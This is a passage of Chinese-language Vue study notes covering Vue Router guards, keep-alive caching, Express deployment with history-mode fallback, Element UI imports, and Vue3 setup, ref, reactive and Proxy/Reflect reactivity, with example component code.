      <keep-alive include="News">
      <router-view></router-view>
      </keep-alive>
    </div>
  </div>
</template>

<script>
export default {
  name: "Home",
  beforeDestroy() {
    console.log("home组件即将被销毁了");
  },
  mounted() {
    console.log("Home组件挂载完毕了", this);
    window.homeRouter = this.$route;
    window.HomeRouter = this.$router;
  },
};
</script>

```

src\pages\Message.vue

```vue
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!-- 跳转路由并携带param参数，to的字符串写法 -->
        <!-- <router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{m.title}}-1</router-link> &nbsp; &nbsp; -->
        <!-- 跳转并携带query参数，to的对象写法 -->
        <router-link
          :to="{
            //path: '/home/message/detail',
            name: 'xiangqing',
            query: {
              id: m.id,
              title: m.title,
            },
          }"
          >{{ m.title }}</router-link
        >
        <button @click="pushShow(m)">push查看</button>
        <button @click="replaceShow(m)">replace查看</button>
      </li>
    </ul>
    <hr />
    <router-view></router-view>
  </div>
</template>

<script>
export default {
  name: "Message",
  data() {
    return {
      messageList: [
        { id: "001", title: "消息001" },
        { id: "002", title: "消息002" },
        { id: "003", title: "消息003" },
      ],
    };
  },
  methods: {
    pushShow(m) {
      this.$router
        .push({
          name: "xiangqing",
          query: {
            id: m.id,
            title: m.title,
          },
        })
        .catch((err) => {
          if (err.name !== "NavigationDuplicated") {
            throw err;
          }
          // 对于重复导航，可以选择忽略错误
        });
    },
    replaceShow(m) {
      this.$router
        .replace({
          name: "xiangqing",
          query: {
            id: m.id,
            title: m.title,
          },
        })
        .catch((err) => {
          if (err.name !== "NavigationDuplicated") {
            throw err;
          }
          // 对于重复导航，可以选择忽略错误
        });
    },
  },
};
</script>
```

src\pages\Detail.vue

```vue
<template>
  <ul>
    <!-- <li>消息编号： {{$route.params.id}}</li> -->
    <!-- <li>消息标题： {{$route.params.title}}</li> -->
    <li>消息编号： {{ id }}</li>
    <li>消息标题： {{ title }}</li>
    <li>其他参数： {{ a }},{{ b }}</li>
  </ul>
</template>

<script>
export default {
  name: "Detail",
  props: ["id", "title", "a", "b"],
  computed: {
    // id(){
    // 	return this.$route.query.id
    // },
    // title(){
    // 	return this.$route.query.title
    // },
  },
  mounted() {
     console.log('detail组件完毕',this.$route)
  },
};
</script>
```

src\pages\News.vue

```vue
<template>
  <ul>
    <li :style="{ opacity }">欢迎学习Vue</li>
    <li>news001 <input type="text" /></li>
    <li>news002 <input type="text" /></li>
    <li>news003 <input type="text" /></li>
  </ul>
</template>

<script>
export default {
  name: "News",
  data() {
    return {
      opacity: 1,
    };
  },
  /* beforeDestroy(){
    //由于存在组件缓存的关系，导致此在组件被切换时，不能被停止，定时器一直在执行，造成浪费。
    console.log('News组件即将被销毁了');
    clearInterval(this.timer);
  },
  mounted(){
    this.timer = setInterval(()=>{
      console.log('@');
      this.opacity -= 0.01;
      if(this.opacity <= 0){
        this.opacity = 1;
      }
    });
  } */

  //组件被激活时
  activated() {
    this.timer = setInterval(() => {
      console.log("@");
      this.opacity -= 0.01;
      if (this.opacity <= 0) {
        this.opacity = 1;
      }
    });
  },
  //组件被切换时，或者失活时
  deactivated() {
    console.log("News组件失活了");
    clearInterval(this.timer);
  },
};
</script>

```

运行

![image-20250216151811734](.\images\image-20250216151811734.png)

![image-20250216151855153](.\images\image-20250216151855153.png)

总结：独享守卫

```js
beforeEnter(to,from,next){
	console.log('beforeEnter',to,from)
	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
		if(localStorage.getItem('school') === 'atguigu'){
			next()
		}else{
			alert('暂无权限查看')
			// next({name:'guanyu'})
		}
	}else{
		next()
	}
}
```

### 4.13 组件内路由守卫

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入VueRouter
import VueRouter from 'vue-router'
//引入路由器
import router from './router'

//关闭Vue的生产提示
Vue.config.productionTip = false

//应用插件
Vue.use(VueRouter)

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	router: router
})
```

src\App.vue

```vue
<template>
  <div>
    <div class="row">
        <Banner />
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!-- Vue中借助router-link标签实现路由的切换  -->
          <router-link class="list-group-item" active-class="active" :to="{
            name: 'guanyu'
          }">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <!-- 指定组件呈现的位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import Banner from './components/Banner'

export default {
  name: "App",
  components: {Banner}
};
</script>
```

src\router\index.js

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

//创建并暴露一个路由器
const router =  new VueRouter({
    routes: [
        {
            name: 'guanyu',
            path: '/about',
            component: About,
            meta: { isAuth:true,title: '关于' }
        },
        {
            path: '/home',
            component: Home,
            meta: { title: '主页' },
            children: [
                {
                    path: 'news',
                    component: News,
                    meta: { isAuth: true,title: '新闻' },
                    beforeEnter: (to,from,next) =>{
                        console.log('独享路由宝卫',to,from)
                        //仅对新闻判断是否需要鉴权
                        if(to.meta.isAuth){
                            if(localStorage.getItem('school') === 'test')
                            {
                                next();
                            }
                            else{
                                alert('学校名称不对，无权查看');
                            }
                        }
                        else{
                            next();
                        }
                    }
                },
                {
                    path: 'message',
                    component: Message,
                    meta: { isAuth: true, title: '消息' },
                    children: [
                        {
                            name: 'xiangqing',
                            path: 'detail',
                            component: Detail,
                            meta: { isAuth: true, title: '详情' },
                            // props的第一种写法，值为对象，该对象中所有key-value都会以props的形式传递给Detail组件
                            // props: {a:1,b:'hello'}
                            //props的第二种写法，值为布尔值，就会把该路由组件收到的所有params参数，以porps的形式传递给Details组件
                            // props: true
                            //第三种写法，值为函数
                            props($route) {
                                return {
                                    id: $route.query.id,
                                    title: $route.query.title,
                                    a: 1,
                                    b: 'hello'
                                }
                            }
                        }
                    ]
                }
            ]
        }
    ]
})

// //全局前轩路由守卫——初始化的时候被调用、每次路由切换之前被调用。
// router.beforeEach((to, from, next) => {
//     console.log('前置路由守卫', to, from);
//     //判断是否需要鉴权
//     if(to.meta.isAuth){
//         console.log('学校名称',localStorage.getItem('school'))
//         if(localStorage.getItem('school') === 'test' )
//         {
//             next();
//         }
//         else{
//             alert('学校名称不对，无权查看')
//         }
//     }
//     else{
//         next();
//     }
// })


//全局后置路由守卫——初始化的时候调用、每次路由切换完成后调用。
router.afterEach((to,from)=>{
    console.log('后置路由守卫',to,from);
    document.title = to.meta.title || '系统'
})


export default router
```

src\components\Banner.vue

```vue
<template>
  <div class="col-xs-offset-2 col-xs-8">
    <div class="page-header">
      <h2>Vue Router Demo</h2>
      <button @click="back">后退</button>
      <button @click="forward">前进</button>
      <button @click="go">测试一下go</button>
    </div>
  </div>
</template>

<script>
export default {
  name: "Banner",
  methods:{
    back(){
      this.$router.back();
    },
    forward(){
      this.$router.forward();
    },
    go(){
      this.$router.go(2);
    }
  }
};
</script>
```

src\pages\About.vue

```vue
<template>
  <h2>我是About的内容</h2>
</template>

<script>
export default {
  name: "About",
  beforeDestroy() {
    console.log('About组件即将被销毁了');
  },
  mounted(){
    console.log('Abount组件挂载完毕了',this);
    window.abountRoute = this.$route;
    window.abountRouter = this.$router;
  },
  //通过路由规则，进入该组件时被调用
  beforeRouteEnter(to,from,next){
    console.log('About--beforeRouteEnter',to,from);
    if(to.meta.isAuth)
    {
      if(localStorage.getItem('school') === 'test')
      {
        next();
      }
      else{
        alert('学校名称不对，无权限查看');
      }
    }
    else{
      next();
    }
  },
  //通过路由规则，离开该组件时被调用
  beforeRouteLeave(to,from,next){
    console.log('About-beforeRouteLeave',to,from)
    next();
  }
};
</script>

```

src\pages\Home.vue

```vue
<template>
  <div>
    <h2>我是Home的内容</h2>
    <div>
      <ul class="nav nav-tabs">
        <li>
          <router-link class="list-group-item" active-class="active" to="/home/news"
            >News</router-link
          >
        </li>
        <li>
          <router-link class="list-group-item" active-class="active" to="/home/message"
            >Message</router-link
          >
        </li>
      </ul>
      <!-- 缓存多个路由组件 -->
			<!-- <keep-alive :include="['News','Message']"> -->
      <!-- 缓存一个路由组件 -->
      <keep-alive include="News">
      <router-view></router-view>
      </keep-alive>
    </div>
  </div>
</template>

<script>
export default {
  name: "Home",
  beforeDestroy() {
    console.log("home组件即将被销毁了");
  },
  mounted() {
    console.log("Home组件挂载完毕了", this);
    window.homeRouter = this.$route;
    window.HomeRouter = this.$router;
  },
};
</script>

```

src\pages\Message.vue

```vue
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!-- 跳转路由并携带param参数，to的字符串写法 -->
        <!-- <router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{m.title}}-1</router-link> &nbsp; &nbsp; -->
        <!-- 跳转并携带query参数，to的对象写法 -->
        <router-link
          :to="{
            //path: '/home/message/detail',
            name: 'xiangqing',
            query: {
              id: m.id,
              title: m.title,
            },
          }"
          >{{ m.title }}</router-link
        >
        <button @click="pushShow(m)">push查看</button>
        <button @click="replaceShow(m)">replace查看</button>
      </li>
    </ul>
    <hr />
    <router-view></router-view>
  </div>
</template>

<script>
export default {
  name: "Message",
  data() {
    return {
      messageList: [
        { id: "001", title: "消息001" },
        { id: "002", title: "消息002" },
        { id: "003", title: "消息003" },
      ],
    };
  },
  methods: {
    pushShow(m) {
      this.$router
        .push({
          name: "xiangqing",
          query: {
            id: m.id,
            title: m.title,
          },
        })
        .catch((err) => {
          if (err.name !== "NavigationDuplicated") {
            throw err;
          }
          // 对于重复导航，可以选择忽略错误
        });
    },
    replaceShow(m) {
      this.$router
        .replace({
          name: "xiangqing",
          query: {
            id: m.id,
            title: m.title,
          },
        })
        .catch((err) => {
          if (err.name !== "NavigationDuplicated") {
            throw err;
          }
          // 对于重复导航，可以选择忽略错误
        });
    },
  },
};
</script>
```

src\pages\Detail.vue

```vue
<template>
  <ul>
    <!-- <li>消息编号： {{$route.params.id}}</li> -->
    <!-- <li>消息标题： {{$route.params.title}}</li> -->
    <li>消息编号： {{ id }}</li>
    <li>消息标题： {{ title }}</li>
    <li>其他参数： {{ a }},{{ b }}</li>
  </ul>
</template>

<script>
export default {
  name: "Detail",
  props: ["id", "title", "a", "b"],
  computed: {
    // id(){
    // 	return this.$route.query.id
    // },
    // title(){
    // 	return this.$route.query.title
    // },
  },
  mounted() {
     console.log('detail组件完毕',this.$route)
  },
};
</script>
```

src\pages\News.vue

```vue
<template>
  <ul>
    <li :style="{ opacity }">欢迎学习Vue</li>
    <li>news001 <input type="text" /></li>
    <li>news002 <input type="text" /></li>
    <li>news003 <input type="text" /></li>
  </ul>
</template>

<script>
export default {
  name: "News",
  data() {
    return {
      opacity: 1,
    };
  },
  /* beforeDestroy(){
    //由于存在组件缓存的关系，导致此在组件被切换时，不能被停止，定时器一直在执行，造成浪费。
    console.log('News组件即将被销毁了');
    clearInterval(this.timer);
  },
  mounted(){
    this.timer = setInterval(()=>{
      console.log('@');
      this.opacity -= 0.01;
      if(this.opacity <= 0){
        this.opacity = 1;
      }
    });
  } */

  //组件被激活时
  activated() {
    this.timer = setInterval(() => {
      console.log("@");
      this.opacity -= 0.01;
      if (this.opacity <= 0) {
        this.opacity = 1;
      }
    });
  },
  //组件被切换时，或者失活时
  deactivated() {
    console.log("News组件失活了");
    clearInterval(this.timer);
  },
};
</script>

```

运行

![image-20250216153950050](.\images\image-20250216153950050.png)

![image-20250216154015740](.\images\image-20250216154015740.png)

总结：

1. 组件内守卫：

   ```js
   //进入守卫：通过路由规则，进入该组件时被调用
   beforeRouteEnter (to, from, next) {
   },
   //离开守卫：通过路由规则，离开该组件时被调用
   beforeRouteLeave (to, from, next) {
   }
   ```





### 4.14 构建

```sh
# 构建
npm run build
```

新项目构建

```sh
 npm init
 npm i express
 
 #当history需要解决路径匹配的问题时。可使用以下插件
npm i connect-history-api-fallback
 
 node server
```

添加新的路径

```js
const express = require('express')

const app = express()

app.use(express.static(__dirname+'/static'))

app.get('/person',(req,rsp)=>{
    rsp.send({
        name: 'tom',
        age: 18
    })
})
app.listen(5005,(err)=>{
    if(!err){
        console.log('服务器启动成功了')
    }
})
```



![image-20250216235827010](.\images\image-20250216235827010.png)

可以使用一个后端插件解决，或者让后端工程师进行解决

```js
const express = require('express')

const history = require('connect-history-api-fallback');

const app = express()
app.use(history())
app.use(express.static(__dirname+'/static'))

app.get('/person',(req,rsp)=>{
    rsp.send({
        name: 'tom',
        age: 18
    })
})
app.listen(5005,(err)=>{
    if(!err){
        console.log('服务器启动成功了')
    }
})
```

此时便可直接访问

![image-20250216235732566](.\images\image-20250216235732566.png)

总结：

1. 对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。
2. hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。
3. hash模式：
   1. 地址中永远带着#号，不美观 。
   2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。
   3. 兼容性较好。
4. history模式：
   1. 地址干净，美观 。
   2. 兼容性和hash模式相比略差。
   3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。

## 5. element-ui

官网：

```sh
https://element.eleme.cn/#/zh-CN/
```

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
// //引入VueRouter
// import VueRouter from 'vue-router'
// //引入路由器
// import router from './router'

//完整引入
// //引入ElementUI组件库
// import ElementUI from 'element-ui';
// //引入ElementUI全部样式
import 'element-ui/lib/theme-chalk/index.css';
// Vue.use(ElementUI);


//按需引入
import { Button,Row,DatePicker } from 'element-ui';


//应用ElementUI
Vue.component('el-button', Button);
Vue.component('el-row', Row);
Vue.component('el-date-picker', DatePicker);


//关闭Vue的生产提示
Vue.config.productionTip = false

//应用插件
// Vue.use(VueRouter)

//创建vm
new Vue({
	el:'#app',
	render: h => h(App)
	// router: router
})
```

src\App.vue

```vue
<template>
  <div>
    <button>原生的按钮</button>
    <input type="text" />

    <br/>
    
    <el-row>
      <el-button>默认按钮</el-button>
      <el-button type="primary">主要按钮</el-button>
      <el-button type="success">成功按钮</el-button>
      <el-button type="info">信息按钮</el-button>
      <el-button type="warning">警告按钮</el-button>
      <el-button type="danger">危险按钮</el-button>
    </el-row>

    <br />
    <el-date-picker v-model="value1" type="date" placeholder="选择日期">
    </el-date-picker>

    <br />
    <!-- 
    <atguigu-row>
      <el-button icon="el-icon-search" circle></el-button>
      <el-button type="primary" icon="el-icon-s-check" circle></el-button>
      <el-button type="success" icon="el-icon-check" circle></el-button>
      <el-button type="info" icon="el-icon-message" circle></el-button>
      <el-button type="warning" icon="el-icon-star-off" circle></el-button>
      <el-button type="danger" icon="el-icon-delete" circle></el-button>
    </atguigu-row> -->

    <atguigu-date-picker type="date" placeholder="选择日期">
    </atguigu-date-picker>
  </div>
</template>

<script>
export default {
  name: "App",
};
</script>

<style>
</style>
```









# VUE3



<img src=".\images\93624428-53932780-f9ae-11ea-8d16-af949e16a09f.png" style="width:200px" />

## 1. Vue3简介

- 2020年9月18日，Vue.js发布3.0版本，代号：One Piece（海贼王）
- 耗时2年多、[2600+次提交](https://github.com/vuejs/vue-next/graphs/commit-activity)、[30+个RFC](https://github.com/vuejs/rfcs/tree/master/active-rfcs)、[600+次PR](https://github.com/vuejs/vue-next/pulls?q=is%3Apr+is%3Amerged+-author%3Aapp%2Fdependabot-preview+)、[99位贡献者](https://github.com/vuejs/vue-next/graphs/contributors) 
- github上的tags地址：https://github.com/vuejs/vue-next/releases/tag/v3.0.0

## 2.Vue3带来了什么

### 1.性能的提升

- 打包大小减少41%

- 初次渲染快55%, 更新渲染快133%

- 内存减少54%

  ......

### 2.源码的升级

- 使用Proxy代替defineProperty实现响应式

- 重写虚拟DOM的实现和Tree-Shaking

  ......

### 3.拥抱TypeScript

- Vue3可以更好的支持TypeScript

### 4.新的特性

1. Composition API（组合API）

   - setup配置
   - ref与reactive
   - watch与watchEffect
   - provide与inject
   - ......
2. 新的内置组件
   - Fragment 
   - Teleport
   - Suspense
3. 其他改变

   - 新的生命周期钩子
   - data 选项应始终被声明为一个函数
   - 移除keyCode支持作为 v-on 的修饰符
   - ......





## 3. 建Vue3.0工程

#### 1. 使用 vue-cli 创建

官方文档：https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create

```bash
## 查看@vue/cli版本，确保@vue/cli版本在4.5.0以上
vue --version
## 安装或者升级你的@vue/cli
npm install -g @vue/cli
## 创建
vue create vue_test
## 启动
cd vue_test
npm run serve
```

#### .使用 vite 创建

官方文档：https://v3.cn.vuejs.org/guide/installation.html#vite

vite官网：https://vitejs.cn

- 什么是vite？—— 新一代前端构建工具。
- 优势如下：
  - 开发环境中，无需打包操作，可快速的冷启动。
  - 轻量快速的热重载（HMR）。
  - 真正的按需编译，不再等待整个应用编译完成。
- 传统构建 与 vite构建对比图

<img src=".\images\bundler.37740380.png" style="width:500px;height:280px;float:left" /><img src=".\images\esm.3070012d.png" style="width:480px;height:280px" />

```bash
## 创建工程
npm init vite-app <project-name>
## 进入工程目录
cd <project-name>
## 安装依赖
npm install
## 运行
npm run dev
```

## 4. 常用CompositionAPI

官方文档: https://v3.cn.vuejs.org/guide/composition-api-introduction.html

### 4.1 setup函数

src\main.js

```js
//引入的不再是Vue构造函数，引入的是一个名为createApp的工厂函数
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象（类似于Vue2中的vm，但app比Vm更轻）
const app = createApp(App)

//挂载
app.mount('#app')

```

src\App.vue

```vue
<template>
  <h1>一个人的信息</h1>
  <h2>姓名：{{ name }}</h2>
  <h2>年龄: {{ age }}</h2>
  <h2>姓名: {{ sex }}</h2>
  <h2>a的值是: {{ a2 }}</h2>
  <button @click="sayHello">说话(Vue3所配制的-sayHello)</button>
  <br />
  <br />
  <button @click="sayWelcome">说话2(Vue2所配制的-sayWelcome)</button>
  <br />
  <br />
  <button @click="test1">测试一下在Vue2的配制中去读取VUE3中的数据、方法</button>
  <br />
  <br />
  <button @click="test2">测试一下在Vue3的setup配置中去读取Vue2中的数据、方法</button>
</template>

<script>
export default {
  name: "App",
  data() {
    return {
      sex: "男",
      a: 100,
    };
  },
  methods: {
    sayWelcome() {
      alert("欢迎学习Vue3");
    },
    test1() {
      console.log(this.sex);
      console.log(this.name);
      console.log(this.age);
      console.log(this.sayHello);

      console.log('test1----------------------')
    },
  },
  //此处仅测试不考滤响应式的问题
  setup() {
    let name = "张三"
    let age = 18
    let a2 = 200

    //方法
    function sayHello() {
      alert(`我叫${name},我${age}岁了，你好啊`);
    }

    function test2() {
      console.log(name);
      console.log(age);
      console.log(sayHello);
      //获取不到
      console.log(this.sex);
      console.log(this.sayWelcome);

      console.log('test2----------------------')
    }

    //返回一个对象
    return {
      name,
      age,
      sayHello,
      test2,
      a2
    };
  }
};
</script>

<style></style>

```

总结：

1. 理解：Vue3.0中一个新的配置项，值为一个函数。
2. setup是所有<strong style="color:#DD5145">Composition API（组合API）</strong><i style="color:gray;font-weight:bold">“ 表演的舞台 ”</i>。
3. 组件中所用到的：数据、方法等等，均要配置在setup中。
4. setup函数的两种返回值：
   1. 若返回一个对象，则对象中的属性、方法, 在模板中均可以直接使用。（重点关注！）
   2. <span style="color:#aad">若返回一个渲染函数：则可以自定义渲染内容。（了解）</span>
5. 注意点：
   1. 尽量不要与Vue2.x配置混用
      - Vue2.x配置（data、methos、computed...）中<strong style="color:#DD5145">可以访问到</strong>setup中的属性、方法。
      - 但在setup中<strong style="color:#DD5145">不能访问到</strong>Vue2.x配置（data、methos、computed...）。
      - 如果有重名, setup优先。
   2. setup不能是一个async函数，因为返回值不再是return的对象, 而是promise, 模板看不到return对象中的属性。（后期也可以返回一个Promise实例，但需要Suspense和异步组件的配合）



### 4.2 ref函数

src\main.js

```js
//引入的不再是Vue构造函数，引入的是一个名为createApp的工厂函数
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象（类似于Vue2中的vm，但app比Vm更轻）
const app = createApp(App)

//挂载
app.mount('#app')

```

src\App.vue

```vue
<template>
  <h1>一个人的信息</h1>
  <h2>姓名: {{name}}</h2>
  <h2>年龄: {{age}}</h2>
  <h2>工作种类: {{job.type}}</h2>
  <h2>工作薪水: {{job.salary}}</h2>
  <button @click="changeInfo">修改人的信息</button>
</template>

<script>
import {ref} from 'vue'
export default {
    name: 'App',
    setup(){
       //数据,ref函数，将一般类型转换为响应式对象，类型为RefImpl
       let name=ref('张三')
       let age = ref(18)
       //将对象类型转换为响应式对象，类型为Proxy
       let job = ref({
        type: '前端工程师',
        salary: '21K'
       })

       //方法
       function changeInfo(){
          name.value = '李四'
          age.value = 33
          console.log(job.value)
          job.value.type = '设计师'
          job.value.salary = '55K'
          console.log(name,age)
       }

       //返回一个对象
       return {
          name,
          age,
          job,
          changeInfo
       }
    }
}
</script>

```



![image-20250225224920041](.\images\image-20250225224920041.png)



总结：ref函数

- 作用: 定义一个响应式的数据
- 语法: ```const xxx = ref(initValue)``` 
  - 创建一个包含响应式数据的<strong style="color:#DD5145">引用对象（reference对象，简称ref对象）</strong>。
  - JS中操作数据： ```xxx.value```
  - 模板中读取数据: 不需要.value，直接：```<div>{{xxx}}</div>```
- 备注：
  - 接收的数据可以是：基本类型、也可以是对象类型。
  - 基本类型的数据：响应式依然是靠``Object.defineProperty()``的```get```与```set```完成的。
  - 对象类型的数据：内部 <i style="color:gray;font-weight:bold">“ 求助 ”</i> 了Vue3.0中的一个新函数—— ```reactive```函数。







### 4.3 reactive函数

src\main.js

```js
//引入的不再是Vue构造函数，引入的是一个名为createApp的工厂函数
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象（类似于Vue2中的vm，但app比Vm更轻）
const app = createApp(App)

//挂载
app.mount('#app')

```

src\App.vue

```vue
<template>
  <h1>一个人的信息</h1>
  <h2>姓名: {{person.name}}</h2>
  <h2>年龄: {{person.age}}</h2>
  <h2>工作种类: {{person.job.type}}</h2>
  <h2>工作薪水: {{person.job.salary}}</h2>
  <h3>爱好: {{person.hobby}}</h3>
  <h3>测试的数据: {{person.job.a.b.c}}</h3>
  <button @click="changeInfo">修改人的信息</button>
</template>

<script>
import {reactive} from 'vue'
export default {
    name: 'App',
    setup(){
      let person = reactive({
        name: '张三',
        arg: 18,
        job: {
            type: '前端工程师',
            salary: '30K',
            a: {
              b: {
                c: 666
              }
            }
        },
        hobby: ['上网','喝酒','睡觉']
      })

      console.log('reactive',person)


      function changeInfo(){
        person.name = '李四'
        person.age = 32
        person.job.type = '工程师'
        person.job.salary = '55K'
        person.job.a.b.c = 322
        person.hobby[0]='学VUE'
      }

      return {
        person,
        changeInfo
      }

    }
}
</script>

```



![image-20250225230007429](.\images\image-20250225230007429.png)



总结：reactive函数

- 作用: 定义一个<strong style="color:#DD5145">对象类型</strong>的响应式数据（基本类型不要用它，要用```ref```函数）
- 语法：```const 代理对象= reactive(源对象)```接收一个对象（或数组），返回一个<strong style="color:#DD5145">代理对象（Proxy的实例对象，简称proxy对象）</strong>
- reactive定义的响应式数据是“深层次的”。
- 内部基于 ES6 的 Proxy 实现，通过代理对象操作源对象内部数据进行操作。



### 4.4 VUE3的原理

vue2的原理回顾

```html
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>VUE中的响应式原理</title>
</head>

<body>
    <script type="text/javascript">

        //数据源
        let person = {
            name: '张三',
            age: 18
        }

        //模拟VUE2中的响应式
        //#region 
        let p = {}
        Object.defineProperty(p, 'name', {
            //可以配制，加此后，属性就可以删除了,删除delete p.name
            configurable: true,
            get() {
                console.log('name属性被读取了');
                return person.name
            },
            set(value) {
                console.log('name属性被修改了', value);
                person.name = value
            }
        })
        Object.defineProperty(p, 'age', {
            get() {
                console.log('age属性被读取了');
                return person.age
            },
            set(value) {
                console.log('age属性被修改了', value);
                person.age = value
            }
        })
        //#endregion

    </script>
</body>

</html>
```

![image-20250226122059979](.\images\image-20250226122059979.png)

vue3的原理

```vue
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>VUE3中的响应式原理</title>
</head>

<body>
    <script type="text/javascript">

        //数据源
        let person = {
            name: '张三',
            age: 18
        }

        //模拟Vue3中和响应式
        const p = new Proxy(person, {
            //有读取P的某个属性时调用
            get(target, propName) {
                console.log(`有人读取了P身上的${propName}属性`)
                //使用语法进行值的读取
                return target[propName]
            },
            //有人修改P的属性或者给P追加某个属性时调用
            set(target, propName, value) {
                console.log(`有人设置了P身上的${propName}属性`)
                //值的修改
                target[propName] = value
            },
            deleteProperty(target, propName) {
                console.log(`有人删除了P身上的${propName}属性`)
                return delete target[propName];
            }
        })


    </script>
</body>

</html>
```

![image-20250226122957271](.\images\image-20250226122957271.png)

实现原理:

```vue
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>VUE3中的响应式原理-实现</title>
</head>

<body>
    <script type="text/javascript">

        //数据源
        let person = {
            name: '张三',
            age: 18
        }

        //模拟Vue3中和响应式
        const p = new Proxy(person, {
            //有读取P的某个属性时调用
            get(target, propName) {
                console.log(`有人读取了P身上的${propName}属性`)
                return Reflect.get(target,propName);
            },
            //有人修改P的属性或者给P追加某个属性时调用
            set(target, propName, value) {
                console.log(`有人设置了P身上的${propName}属性`)
                Reflect.set(target,propName,value)
            },
            deleteProperty(target, propName) {
                console.log(`有人删除了P身上的${propName}属性`)
                return Reflect.deleteProperty(target,propName)
            }
        })


    </script>
</body>

</html>
```



![image-20250226123558169](.\images\image-20250226123558169.png)



问题：

```html
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>VUE3中的响应式原理-实现</title>
</head>

<body>
    <script type="text/javascript">

        //数据源
        let person = {
            name: '张三',
            age: 18
        }

        let obj = { a: 1, b: 2 }

        Object.defineProperty(obj, 'c', {
            get() {
                return 3
            }
        })

        Object.defineProperty(obj, 'c', {
            get() {
                return 4
            }
        })


    </script>
</body>

</html>
```



出现编译错误：

![image-20250226123956733](.\images\image-20250226123956733.png)



通过反射定义

```html
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>VUE3中的响应式原理-实现</title>
</head>

<body>
    <script type="text/javascript">

        //数据源
        let person = {
            name: '张三',
            age: 18
        }

        let obj = { a: 1, b: 2 }

        //#region 
        //只能通过tr-catch解决。
        // try {
        //     Object.defineProperty(obj, 'c', {
        //         get() {
        //             return 3
        //         }
        //     })

        //     Object.defineProperty(obj, 'c', {
        //         get() {
        //             return 4
        //         }
        //     })
        // } catch (error) {
        //     console.log(error)
        // }
        //#endregion 

        //通过Reflect.defineProperty去操作
        const x1 = Reflect.defineProperty(obj, 'c', {
            get() {
                return 3
            }
        })
        console.log('定义操作结果成功1:', x1)

        const x2 = Reflect.defineProperty(obj, 'c', {
            get() {
                return 4
            }
        })
        console.log('定义操作结果成功2:', x2)


    </script>
</body>

</html>
```

结果：

![image-20250226124330405](.\images\image-20250226124330405.png)



总结：Vue3.0的响应式

- 实现原理: 

  - 通过Proxy（代理）:  拦截对象中任意属性的变化, 包括：属性值的读写、属性的添加、属性的删除等。

  - 通过Reflect（反射）:  对源对象的属性进行操作。

  - MDN文档中描述的Proxy与Reflect：

    - Proxy：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy

    - Reflect：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect

      ```js
      new Proxy(data, {
      	// 拦截读取属性值
          get (target, prop) {
          	return Reflect.get(target, prop)
          },
          // 拦截设置属性值或添加新属性
          set (target, prop, value) {
          	return Reflect.set(target, prop, value)
          },
          // 拦截删除属性
          deleteProperty (target, prop) {
          	return Reflect.deleteProperty(target, prop)
          }
      })
      
      proxy.name = 'tom'   
      ```

#### reactive对比ref

-  从定义数据角度对比：
   -  ref用来定义：<strong style="color:#DD5145">基本类型数据</strong>。
   -  reactive用来定义：<strong style="color:#DD5145">对象（或数组）类型数据</strong>。
   -  备注：ref也可以用来定义<strong style="color:#DD5145">对象（或数组）类型数据</strong>, 它内部会自动通过```reactive```转为<strong style="color:#DD5145">代理对象</strong>。
-  从原理角度对比：
   -  ref通过``Object.defineProperty()``的```get```与```set```来实现响应式（数据劫持）。
   -  reactive通过使用<strong style="color:#DD5145">Proxy</strong>来实现响应式（数据劫持）, 并通过<strong style="color:#DD5145">Reflect</strong>操作<strong style="color:orange">源对象</strong>内部的数据。
-  从使用角度对比：
   -  ref定义的数据：操作数据<strong style="color:#DD5145">需要</strong>```.value```，读取数据时模板中直接读取<strong style="color:#DD5145">不需要</strong>```.value```。
   -  reactive定义的数据：操作数据与读取数据：<strong style="color:#DD5145">均不需要</strong>```.value```。





### 4.5 setup的注意点（两个）

src\main.js

```js
//引入的不再是Vue构造函数，引入的是一个名为createApp的工厂函数
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象（类似于Vue2中的vm，但app比Vm更轻）
const app = createApp(App)

//挂载
app.mount('#app')

```

src\App.vue

```vue
<template>
    <DemoComp @hello="showHelloMsg" msg="你好啊" school="交大">
        <!-- 在Vue3中，建议使用v-slot:qwe的方式指定名称，否则会报错 -->
        <template v-slot:qwe>
            <span>上海</span>
        </template>
        <template v-slot:asd>
            <span>闵行</span>
        </template>
    </DemoComp>
</template>

<script>
import DemoComp from './components/Demo'
export default {
  name: 'App',
  components: {DemoComp},
  beforeCreate(){
    console.log('---beforeCreate---执行了')
  },
  setup(){
      console.log('---setup初始化了...',this)

    function showHelloMsg(value){
      alert(`你好啊,你触发了hello事件，我收到的参数是${value}`)
    }
    
    return {
      showHelloMsg
    }
  }
}
</script>

